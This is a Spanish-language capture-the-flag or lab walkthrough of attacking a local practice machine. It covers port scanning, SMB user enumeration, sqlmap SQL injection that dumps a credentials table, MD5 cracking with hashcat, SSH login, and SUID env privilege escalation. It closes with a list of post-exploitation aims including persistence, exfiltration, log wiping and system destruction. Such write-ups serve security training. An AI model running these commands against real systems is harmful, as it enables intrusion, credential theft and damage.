# 🛡️ SMB - MD5

## 1. 📡 Comprobación de Conectividad

```bash
ping 172.17.0.2
```

---

## 2. 🔍 Escaneo de Puertos Abiertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

✅ Puertos abiertos detectados:

```
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
```

---

## 3. 🔎 Detección de Versiones de Servicios

```bash
nmap -p22,80 -sCV 172.17.0.2
```

| Puerto | Servicio                        |
|--------|----------------------------------|
| 22/tcp | OpenSSH 8.9p1 (Ubuntu)           |
| 80/tcp | Apache httpd 2.4.52 (Ubuntu)     |
| 139/445 | Samba smbd 4.x                  |

---

## 4. 📂 Enumeración de Servicios SMB

### enum4linux

```bash
enum4linux -a 172.17.0.2
```

✅ Usuario descubierto: `dylan`  
✅ Recursos compartidos visibles:

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
shared          Disk      
IPC$            IPC       IPC Service (Samba, Ubuntu)
```

**Usuarios locales:**

- dylan  
- augustus  
- bob

---

### smbclient

```bash
smbclient -L //172.17.0.2 -N
```

Mismos recursos detectados. El protocolo SMB1 no está habilitado.

---

### smbmap

```bash
smbmap -H 172.17.0.2
```

Todos los recursos aparecen como `NO ACCESS`.

---

### rpcclient

```bash
rpcclient -U "" -N 172.17.0.2
```

Enumeración de usuarios:

```
user:[dylan] rid:[0x3e9]
```

Consulta de usuario `501` (`nobody`) no proporciona información útil.

---

### crackmapexec

```bash
crackmapexec smb 172.17.0.2 --users users.txt --continue-on-success
```

✅ Usuario encontrado: `dylan`

---

## 5. 💉 Inyección SQL

### Enumeración de Bases de Datos

```bash
sqlmap -u http://172.17.0.2/index.php --forms --dbs --batch
```

Bases de datos disponibles:

- information_schema  
- mysql  
- performance_schema  
- **register**  
- sys

### Extracción de Tablas

```bash
sqlmap -u http://172.17.0.2/index.php --forms -D register --tables --batch
```

✅ Tabla: `users`

### Dump de Credenciales

```bash
sqlmap -u http://172.17.0.2/index.php --forms -D register -T users --dump --batch
```

| Username | Password Hash          |
|----------|------------------------|
| dylan    | KJSDFG789FGSDF78       |

---

## 6. 🔓 Acceso a SMB

Tras obtener acceso a SMB usando el usuario `dylan`, se encuentra un archivo llamado `augustus.txt` con el siguiente hash:

```
061fba5bdfc076bb7362616668de87c8
```

---

## 7. 🧠 Cracking de Hash

```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Resultado:

```
061fba5bdfc076bb7362616668de87c8:lovely
```

✅ Contraseña del usuario `augustus`: `lovely`

---

## 8. 🧑‍💻 Acceso SSH

```bash
ssh augustus@172.17.0.2
```

Con la contraseña `lovely`, se obtiene acceso exitoso.

---

## 9. 🚀 Escalada de Privilegios

```bash
find / -perm -4000 -type f 2>/dev/null
```

✅ Se detecta `/usr/bin/env` como posible vector de escalada.

📌 Tras explotación, se obtiene acceso como **root**.

---

## 🔧 Post-Explotación

Con privilegios de root se pueden realizar diversas acciones:

- ✅ Mantener el acceso (persistencia)
- 👤 Crear usuarios ocultos
- 🔐 Añadir claves públicas SSH
- 📦 Exfiltrar información sensible
- 🌐 Explorar la red interna
- 🔀 Hacer pivoting a otras máquinas
- 🧹 Borrar huellas
- 💣 Destruir el sistema (⚠️ uso malicioso)
